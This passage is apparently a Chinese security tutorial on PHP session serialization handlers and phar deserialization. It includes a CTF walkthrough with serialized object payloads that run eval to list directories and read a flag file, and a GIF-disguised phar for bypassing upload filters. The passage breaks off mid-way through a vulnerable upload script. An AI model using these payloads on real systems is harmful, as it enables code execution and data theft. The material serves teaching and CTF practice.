<p><code>session</code>英文翻译为"会话"，两个人聊天从开始到结束就构成了一个会话。<code>PHP</code>里的<code>session</code>主要是指客户端浏览器与服务端数据交换的对话，从浏览器打开到关闭，一个最简单的会话周期</p>
<h2 data-content="1" id="cc51d4a971a9a01b5c2e0ad9cbedf69d">PHP session工作流程</h2>
<p>会话的工作流程很简单，当开始一个会话时，<code>PHP</code>会尝试从请求中查找会话 <code>ID</code> （通常通过会话 <code>cookie</code>），如果发现请求的<code>Cookie</code>、<code>Get</code>、<code>Post</code>中不存在<code>session id</code>，<code>PHP</code> 就会自动调用<code>php_session_create_id</code>函数创建一个新的会话，并且在<code>http response</code>中通过<code>set-cookie</code>头部发送给客户端保存，例如登录如下网页<code>Cokkie、Get、Post</code>都不存在<code>session id</code>，于是就使用了<code>set-cookie</code>头</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144834-72365e9a-0518-1.png"/></p>
<p>有时候浏览器用户设置会禁止 <code>cookie</code>，当在客户端<code>cookie</code>被禁用的情况下，<code>php</code>也可以自动将<code>session id</code>添加到<code>url</code>参数中以及<code>form</code>的<code>hidden</code>字段中，但这需要将<code>php.ini</code>中的<code>session.use_trans_sid</code>设为开启，也可以在运行时调用<code>ini_set</code>来设置这个配置项</p>
<p>会话开始之后，<code>PHP</code> 就会将会话中的数据设置到 <code>$_SESSION</code> 变量中，如下述代码就是一个在 <code>$_SESSION</code> 变量中注册变量的例子：</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nb">session_start</span><span class="p">();</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]))</span> <span class="p">{</span>
  <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'ghtwf01'</span> <span class="p">;</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>代码的意思就是如果不存在<code>session</code>那么就创建一个<code>session</code><br/>
也可以用如下流程图表示</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144840-76164138-0518-1.png"/></p>
<h2 data-content="1" id="b564e63a775a862bdf27b6d9ce74fac8">php.ini配置</h2>
<p><code>php.ini</code>里面有如下六个相对重要的配置</p>
<div class="highlight"><pre><span></span><span class="x">session.save_path=""      --设置session的存储位置</span>
<span class="x">session.save_handler=""   --设定用户自定义存储函数，如果想使用PHP内置session存储机制之外的可以使用这个函数</span>
<span class="x">session.auto_start        --指定会话模块是否在请求开始时启动一个会话，默认值为 0，不启动</span>
<span class="x">session.serialize_handler --定义用来序列化/反序列化的处理器名字，默认使用php  </span>
<span class="x">session.upload_progress.enabled --启用上传进度跟踪，并填充$ _SESSION变量，默认启用</span>
<span class="x">session.upload_progress.cleanup --读取所有POST数据（即完成上传）后，立即清理进度信息，默认启用</span>
</pre></div>
<p>如<code>phpstudy</code>下上述配置如下：</p>
<div class="highlight"><pre><span></span><span class="x">session.save_path = "/tmp"      --所有session文件存储在/tmp目录下</span>
<span class="x">session.save_handler = files    --表明session是以文件的方式来进行存储的</span>
<span class="x">session.auto_start = 0          --表明默认不启动session</span>
<span class="x">session.serialize_handler = php --表明session的默认(反)序列化引擎使用的是php(反)序列化引擎</span>
<span class="x">session.upload_progress.enabled on --表明允许上传进度跟踪，并填充$ _SESSION变量</span>
<span class="x">session.upload_progress.cleanup on --表明所有POST数据（即完成上传）后，立即清理进度信息($ _SESSION变量)</span>
</pre></div>
<h2 data-content="1" id="374a82af6146c52346f6fb81fcfa3631">PHP session 的存储机制</h2>
<p>上文中提到了 <code>PHP session</code>的存储机制是由<code>session.serialize_handler</code>来定义引擎的，默认是以文件的方式存储，且存储的文件是由<code>sess_sessionid</code>来决定文件名的，当然这个文件名也不是不变的，都是<code>sess_sessionid</code>形式</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144846-79d7b220-0518-1.png"/></p>
<p>打开看一下全是序列化后的内容</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144851-7c6e2e6a-0518-1.png"/></p>
<p>现在我们来看看<code>session.serialize_handler</code>，它定义的引擎有三种</p>
<p>|   处理器名称                |  存储格式                                                              |<br/>
|   php                       |  键名 + 竖线 + 经过serialize()函数序列化处理的值                       |<br/>
|   php_binary                |  键名的长度对应的 ASCII 字符 + 键名 + 经过serialize()函数序列化处理的值|<br/>
|   php_serialize(php&gt;5.5.4)  |  经过serialize()函数序列化处理的数组                                   |</p>
<h3 data-content="1" id="0bceefa5e71448d667570d87e1c04267">php处理器</h3>
<p>首先来看看<code>session.serialize_handler</code>等于<code>php</code>时候的序列化结果，代码如下</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="nb">ini_set</span><span class="p">(</span><span class="s1">'session.serialize_handler'</span><span class="p">,</span><span class="s1">'php'</span><span class="p">);</span>
<span class="nb">session_start</span><span class="p">();</span>
<span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'session'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'session'</span><span class="p">];</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p><code>session</code>的<code>sessionid</code>其实可以看到的，为<code>i38age8ok4bofpiuiku3h20fh0</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144859-81378040-0518-1.png"/></p>
<p>于是我们到<code>session</code>存储目录查看一下<code>session</code>文件内容</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144905-85162680-0518-1.png"/></p>
<p><code>session</code>为<code>$_SESSION['session']</code>的键名，<code>|</code>后为传入<code>GET</code>参数经过序列化后的值</p>
<h3 data-content="1" id="7bfec6b1900ffa07a907bf59b242afaf">php_binary处理器</h3>
<p>再来看看<code>session.serialize_handler</code>等于<code>php_binary</code>时候的序列化结果</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="nb">ini_set</span><span class="p">(</span><span class="s1">'session.serialize_handler'</span><span class="p">,</span><span class="s1">'php_binary'</span><span class="p">);</span>
<span class="nb">session_start</span><span class="p">();</span>
<span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'sessionsessionsessionsessionsession'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'session'</span><span class="p">];</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>为了更能直观的体现出格式的差别，因此这里设置了键值长度为 <code>35</code>，<code>35</code> 对应的 <code>ASCII</code> 码为<code>#</code>，所以最终的结果如下</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144911-888b7d60-0518-1.png"/></p>
<p><code>#</code>为键名长度对应的 <code>ASCII</code> 的值，<code>sessionsessionsessionsessionsessions</code>为键名，<code>s:7:"xianzhi";</code>为传入 <code>GET</code> 参数经过序列化后的值</p>
<h3 data-content="1" id="da29dba9fa7c6fb950f7a240a234a99b">php_serialize 处理器</h3>
<p>最后就是<code>session.serialize_handler</code>等于<code>php_serialize</code>时候的序列化结果，代码如下</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="nb">ini_set</span><span class="p">(</span><span class="s1">'session.serialize_handler'</span><span class="p">,</span><span class="s1">'php_serialize'</span><span class="p">);</span>
<span class="nb">session_start</span><span class="p">();</span>
<span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'session'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'session'</span><span class="p">];</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>结果如下</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144917-8c3357da-0518-1.png"/></p>
<p><code>a:1</code>表示<code>$_SESSION</code>数组中有 <code>1</code> 个元素，花括号里面的内容即为传入<code>GET</code>参数经过序列化后的值</p>
<h2 data-content="1" id="a807bcf9b8391aae7a8ee521d7717f60">session的反序列化漏洞利用</h2>
<p><code>php</code>处理器和<code>php_serialize</code>处理器这两个处理器生成的序列化格式本身是没有问题的，但是如果这两个处理器混合起来用，就会造成危害。形成的原理就是在用<code>session.serialize_handler = php_serialize</code>存储的字符可以引入 <code>|</code> , 再用<code>session.serialize_handler = php</code>格式取出<code>$_SESSION</code>的值时， |会被当成键值对的分隔符，在特定的地方会造成反序列化漏洞。<br/>
我们创建一个<code>session.php</code>，用于传输<code>session</code>值，里面代码如下</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="nb">ini_set</span><span class="p">(</span><span class="s1">'session.serialize_handler'</span><span class="p">,</span><span class="s1">'php_serialize'</span><span class="p">);</span>
<span class="nb">session_start</span><span class="p">();</span>
<span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'session'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'session'</span><span class="p">];</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>再创建一个<code>hello.php</code>，里面代码如下</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
    <span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
  <span class="nb">ini_set</span><span class="p">(</span><span class="s1">'session.serialize_handler'</span><span class="p">,</span><span class="s1">'php'</span><span class="p">);</span>
  <span class="nb">session_start</span><span class="p">();</span>
    <span class="k">class</span> <span class="nc">D0g3</span><span class="p">{</span>
    <span class="k">public</span> <span class="nv">$name</span> <span class="o">=</span> <span class="s1">'panda'</span><span class="p">;</span>
    <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
      <span class="k">echo</span> <span class="s2">"Who are you?"</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
      <span class="k">echo</span> <span class="s1">'&lt;br&gt;'</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="nv">$str</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XianZhi</span><span class="p">();</span>
 <span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>这两个文件的作用很清晰，<code>session.php</code>文件的处理器是<code>php_serialize</code>，<code>hello.php</code>文件的处理器是<code>php</code>，<code>session.php</code>文件的作用是传入可控的 <code>session</code>值，<code>hello.php</code>文件的作用是在反序列化开始前输出<code>Who are you?</code>，反序列化结束的时候输出<code>name</code>值<br/>
运行一下<code>hello.php</code>看一下效果</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144925-90e78454-0518-1.png"/></p>
<p>我们用如下代码来复现一下<code>session</code>的反序列化漏洞</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
    <span class="k">class</span> <span class="nc">D0g3</span><span class="p">{</span>
    <span class="k">public</span> <span class="nv">$name</span> <span class="o">=</span> <span class="s1">'ghtwf01'</span><span class="p">;</span>
    <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
      <span class="k">echo</span> <span class="s2">"Who are you?"</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
      <span class="k">echo</span> <span class="s1">'&lt;br&gt;'</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="nv">$str</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">D0g3</span><span class="p">();</span>
  <span class="k">echo</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$str</span><span class="p">);</span>
 <span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>输出结果为</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144932-94f8e8a8-0518-1.png"/></p>
<p>因为<code>session</code>是<code>php_serialize</code>处理器，所以允许<code>|</code>存在字符串中，所以将这段代码序列化内容前面加上<code>|</code>传入<code>session.php</code>中<br/>
现在来看一下存入<code>session</code>文件的内容</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144936-97555262-0518-1.png"/></p>
<p>再打开<code>hello.php</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144941-9a2ff17c-0518-1.png"/></p>
<h2 data-content="1" id="6bdf1ced2a7fe22e0150f5a7c2889920">一道CTF题:PHPINFO</h2>
<p>题目链接：<a href="http://web.jarvisoj.com:32784/" target="_blank">http://web.jarvisoj.com:32784/</a><br/>
题目中给出如下代码</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="c1">//A webshell is wait for you</span>
<span class="nb">ini_set</span><span class="p">(</span><span class="s1">'session.serialize_handler'</span><span class="p">,</span> <span class="s1">'php'</span><span class="p">);</span>
<span class="nb">session_start</span><span class="p">();</span>
<span class="k">class</span> <span class="nc">OowoO</span>
<span class="p">{</span>
    <span class="k">public</span> <span class="nv">$mdzz</span><span class="p">;</span>
    <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">mdzz</span> <span class="o">=</span> <span class="s1">'phpinfo();'</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="k">eval</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">mdzz</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'phpinfo'</span><span class="p">]))</span>
<span class="p">{</span>
    <span class="nv">$m</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">OowoO</span><span class="p">();</span>
<span class="p">}</span>
<span class="k">else</span>
<span class="p">{</span>
    <span class="nb">highlight_string</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">'index.php'</span><span class="p">));</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>仔细看了一遍发现题目没有入口，注意到<code>ini_set('session.serialize_handler', 'php')</code>，想到可不可能是<code>session</code>反序列化漏洞，看一下<code>phpinfo</code>,发现<code>session.serialize_handler</code>设置如下</p>
<div class="highlight"><pre><span></span><span class="x">local value(当前目录，会覆盖master value内容):php</span>
<span class="x">master value(主目录，php.ini里面的内容):php_serialize</span>
</pre></div>
<p>这个很明显就存在<code>php session</code>反序列化漏洞，但是入口点在哪里，怎么控制<code>session</code>的值<br/>
在<code>phpinfo</code>里面看到了</p>
<div class="highlight"><pre><span></span><span class="x">session.upload_progress.enabled on</span>
<span class="x">session.upload_progress.cleanup off</span>
</pre></div>
<p>当一个上传在处理中，同时<code>POST</code>一个与<code>INI</code>中设置的<code>session.upload_progress.name</code>同名变量时，当<code>PHP</code>检测到这种<code>POST</code>请求时，它会在<code>$_SESSION</code>中添加一组数据。所以可以通过<code>Session Upload Progress</code>来设置<code>session</code><br/>
允许上传且结束后不清除数据，这样更有利于利用<br/>
在<code>html</code>网页源代码上面添加如下代码</p>
<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">"http://web.jarvisoj.com:32784/index.php"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"multipart/form-data"</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">"PHP_SESSION_UPLOAD_PROGRESS"</span> <span class="na">value</span><span class="o">=</span><span class="s">"123"</span> <span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"file"</span> <span class="na">name</span><span class="o">=</span><span class="s">"file"</span> <span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"submit"</span> <span class="p">/&gt;</span>
<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144955-a28f8bca-0518-1.png"/></p>
<p>接下来考虑如何利用</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nb">ini_set</span><span class="p">(</span><span class="s1">'session.serialize_handler'</span><span class="p">,</span> <span class="s1">'php_serialize'</span><span class="p">);</span>
<span class="nb">session_start</span><span class="p">();</span>
<span class="k">class</span> <span class="nc">OowoO</span>
<span class="p">{</span>
    <span class="k">public</span> <span class="nv">$mdzz</span><span class="o">=</span><span class="s1">'print_r(scandir(dirname(__FILE__)));'</span><span class="p">;</span>
<span class="p">}</span>
<span class="nv">$obj</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">OowoO</span><span class="p">();</span>
<span class="k">echo</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$obj</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>得到</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112145001-a60c44a0-0518-1.png"/></p>
<p>为了防止转义，在每个双引号前加上<code>\</code>，即</p>
<div class="highlight"><pre><span></span><span class="x">|O:5:\"OowoO\":1:{s:4:\"mdzz\";s:36:\"print_r(scandir(dirname(__FILE__)));\";}</span>
</pre></div>
<p>点击提交，<code>burpsuite</code>抓包将<code>filename</code>的值改为它</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112145006-a8ff3988-0518-1.png"/></p>
<p>查询到当前目录有哪些文件了，在<code>phpinfo</code>里面查看到当前目录路径</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112145010-abb3dd46-0518-1.png"/></p>
<p>于是我们利用</p>
<div class="highlight"><pre><span></span><span class="x">print_r(file_get_contents("/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php"));</span>
</pre></div>
<p>来读取<code>Here_1s_7he_fl4g_buT_You_Cannot_see.php</code>中的内容，同样的道理加上<code>\</code>后将<code>filename</code>改为</p>
<div class="highlight"><pre><span></span><span class="x">|O:5:\"OowoO\":1:{s:4:\"mdzz\";s:88:\"print_r(file_get_contents(\"/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\"));\";}</span>
</pre></div>
<p>得到<code>flag</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112145016-aefb991c-0518-1.png"/></p>
<h1 data-content="1" id="0b621b9e4714865d9997bf6b28fa97bd">phar拓展反序列化攻击面</h1>
<h2 data-content="1" id="b9a3a4ce0ff240773bea3986da914555">phar文件简介</h2>
<h3 data-content="1" id="038604e0aa827bb2a22e20ad2f8c4014">概念</h3>
<p>一个<code>php</code>应用程序往往是由多个文件构成的，如果能把他们集中为一个文件来分发和运行是很方便的，这样的列子有很多，比如在<code>window</code>操作系统上面的安装程序、一个<code>jquery</code>库等等，为了做到这点<code>php</code>采用了<code>phar</code>文档文件格式，这个概念源自<code>java</code>的<code>jar</code>，但是在设计时主要针对 PHP 的 Web 环境，与 <code>JAR</code> 归档不同的是<code>Phar</code>归档可由 <code>PHP</code> 本身处理，因此不需要使用额外的工具来创建或使用，使用<code>php</code>脚本就能创建或提取它。<code>phar</code>是一个合成词，由<code>PHP</code>和 <code>Archive</code>构成，可以看出它是<code>php</code>归档文件的意思(简单来说<code>phar</code>就是<code>php</code>压缩文档，不经过解压就能被 <code>php</code> 访问并执行)</p>
<h3 data-content="1" id="e0e1be5b96f6e63466e24cce3a624b09">phar组成结构</h3>
<div class="highlight"><pre><span></span><span class="x">stub：它是phar的文件标识，格式为xxx</span><span class="cp">&lt;?php</span> <span class="nx">xxx</span><span class="p">;</span> <span class="nx">__HALT_COMPILER</span><span class="p">();</span><span class="cp">?&gt;</span><span class="x">;</span>
<span class="x">manifest：也就是meta-data，压缩文件的属性等信息，以序列化存储</span>
<span class="x">contents：压缩文件的内容</span>
<span class="x">signature：签名，放在文件末尾</span>
</pre></div>
<p>这里有两个关键点，一是文件标识，必须以<code>__HALT_COMPILER();?&gt;</code>结尾，但前面的内容没有限制，也就是说我们可以轻易伪造一个图片文件或者其它文件来绕过一些上传限制；二是反序列化，<code>phar</code>存储的<code>meta-data</code>信息以序列化方式存储，当文件操作函数通过<code>phar://</code>伪协议解析<code>phar</code>文件时就会将数据反序列化，而这样的文件操作函数有很多</p>
<h3 data-content="1" id="b528ab0eba1c3efc37679923774d8ecb">前提条件</h3>
<div class="highlight"><pre><span></span><span class="x">php.ini中设置为phar.readonly=Off</span>
<span class="x">php version&gt;=5.3.0</span>
</pre></div>
<h2 data-content="1" id="117e4bfcb7b202905d611178f2b2caad">phar反序列化漏洞</h2>
<p>漏洞成因：<code>phar</code>存储的<code>meta-data</code>信息以序列化方式存储，当文件操作函数通过<code>phar://</code>伪协议解析<code>phar</code>文件时就会将数据反序列化</p>
<h3 data-content="1" id="72efb50c460a4a59f69b1f539c613f03">demo测试</h3>
<p>根据文件结构我们来自己构建一个<code>phar</code>文件，<code>php</code>内置了一个<code>Phar</code>类来处理相关操作</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
    <span class="k">class</span> <span class="nc">TestObject</span> <span class="p">{</span>
    <span class="p">}</span>

    <span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="s2">"phar.phar"</span><span class="p">);</span>
    <span class="nv">$phar</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="s2">"phar.phar"</span><span class="p">);</span> <span class="c1">//后缀名必须为phar</span>
    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">startBuffering</span><span class="p">();</span>
    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="s2">"&lt;?php __HALT_COMPILER(); ?&gt;"</span><span class="p">);</span> <span class="c1">//设置stub</span>
    <span class="nv">$o</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">TestObject</span><span class="p">();</span>
    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setMetadata</span><span class="p">(</span><span class="nv">$o</span><span class="p">);</span> <span class="c1">//将自定义的meta-data存入manifest</span>
    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">addFromString</span><span class="p">(</span><span class="s2">"test.txt"</span><span class="p">,</span> <span class="s2">"test"</span><span class="p">);</span> <span class="c1">//添加要压缩的文件</span>
    <span class="c1">//签名自动计算</span>
    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">stopBuffering</span><span class="p">();</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>可以很明显看到<code>manifest</code>是以序列化形式存储的</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112145235-01d2d2fe-0519-1.png"/></p>
<p>有序列化数据必然会有反序列化操作，<code>php</code>一大部分的文件系统函数在通过<code>phar://</code>伪协议解析<code>phar</code>文件时，都会将<code>meta-data</code>进行反序列化<br/>
在网上扒了一张图</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112145239-0436a1c4-0519-1.png"/></p>
<p>用如下demo证明</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span> 
    <span class="k">class</span> <span class="nc">TestObject</span> <span class="p">{</span>
        <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="s1">'hello ghtwf01'</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="nv">$filename</span> <span class="o">=</span> <span class="s1">'phar://phar.phar/test.txt'</span><span class="p">;</span>
    <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span> 
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112145244-07779b54-0519-1.png"/></p>
<p>当文件系统函数的参数可控时，我们可以在不调用<code>unserialize()</code>的情况下进行反序列化操作,极大的拓展了攻击面，其它函数也是可以的，比如<code>file_exists</code>函数,代码如下</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span> 
    <span class="k">class</span> <span class="nc">TestObject</span> <span class="p">{</span>
        <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="s1">'hello ghtwf01'</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="nv">$filename</span> <span class="o">=</span> <span class="s1">'phar://phar.phar/a_random_string'</span><span class="p">;</span>
    <span class="nb">file_exists</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
 <span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112145250-0ab8db34-0519-1.png"/></p>
<h3 data-content="1" id="98b36ed89dc6bfc34b1d43fed801d3c2">将phar伪造成其他格式的文件</h3>
<p>在前面分析<code>phar</code>的文件结构时可能会注意到，<code>php</code>识别<code>phar</code>文件是通过其文件头的<code>stub</code>，更确切一点来说是<code>__HALT_COMPILER();?&gt;</code>这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将<code>phar</code>文件伪装成其他格式的文件</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
    <span class="k">class</span> <span class="nc">TestObject</span> <span class="p">{</span>
    <span class="p">}</span>

    <span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="s2">"phar.phar"</span><span class="p">);</span>
    <span class="nv">$phar</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="s2">"phar.phar"</span><span class="p">);</span>
    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">startBuffering</span><span class="p">();</span>
    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="s2">"GIF89a"</span><span class="o">.</span><span class="s2">"&lt;?php __HALT_COMPILER(); ?&gt;"</span><span class="p">);</span> <span class="c1">//设置stub，增加gif文件头</span>
    <span class="nv">$o</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">TestObject</span><span class="p">();</span>
    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setMetadata</span><span class="p">(</span><span class="nv">$o</span><span class="p">);</span> <span class="c1">//将自定义meta-data存入manifest</span>
    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">addFromString</span><span class="p">(</span><span class="s2">"test.txt"</span><span class="p">,</span> <span class="s2">"test"</span><span class="p">);</span> <span class="c1">//添加要压缩的文件</span>
    <span class="c1">//签名自动计算</span>
    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">stopBuffering</span><span class="p">();</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112145254-0d4bc884-0519-1.png"/></p>
<p>采用这种方法可以绕过很大一部分上传检测</p>
<h4 data-content="1" id="5aff5eb89d25a9282e4dd6d9e0221e1d">利用条件</h4>
<div class="highlight"><pre><span></span><span class="x">phar文件需要上传到服务器端</span>
<span class="x">要有可用的魔术方法作为“跳板”</span>
<span class="x">文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤</span>
</pre></div>
<h4 data-content="1" id="3450154669323f2d6f9431a8c7c3cd94">漏洞复现</h4>
<p>upload.php<br/>
白名单只允许上传<code>jpg,png,gif</code></p>
<div class="highlight"><pre><span></span><span class="x">&lt;!DOCTYPE html&gt;</span>
<span class="x">&lt;html&gt;</span>
<span class="x">&lt;head&gt;</span>
<span class="x">    &lt;title&gt;文件上传&lt;/title&gt;</span>
<span class="x">&lt;/head&gt;</span>
<span class="x">&lt;body&gt;</span>
<span class="x">    &lt;form method="post" enctype="multipart/form-data"&gt;</span>
<span class="x">        &lt;input type="file" name="pic" /&gt;</span>
<span class="x">        &lt;input type="submit" value="上传"/&gt;</span>
<span class="x">&lt;/body&gt;</span>
<span class="x">&lt;/html&gt;</span>
<span class="cp">&lt;?php</span>
    <span class="nb">header</span><span class="p">(</span><span class="s2">"Content-type:text/html;charset=utf-8"</span><span class="p">);</span>
    <span class="nv">$ext_arr</span><span class="o">=</span><span class="k">array</span><span class="p">(</span><span class="s1">'.jpg'</span><span class="p">,</span><span class="s1">'.png'</span><span class="p">,</span><span class="s1">'.gif'</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">)){</span>
        <span class="k">echo</span> <span class="s2">"请上传文件"</span><span class="p">;</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        <span class="nb">define</span><span class="p">(</span><span class="s2">"PATH"</span><span class="p">,</span><span class="nb">dirname</span><span class="p">(</span><span class="no">__DIR__</span><span class="p">));</span>
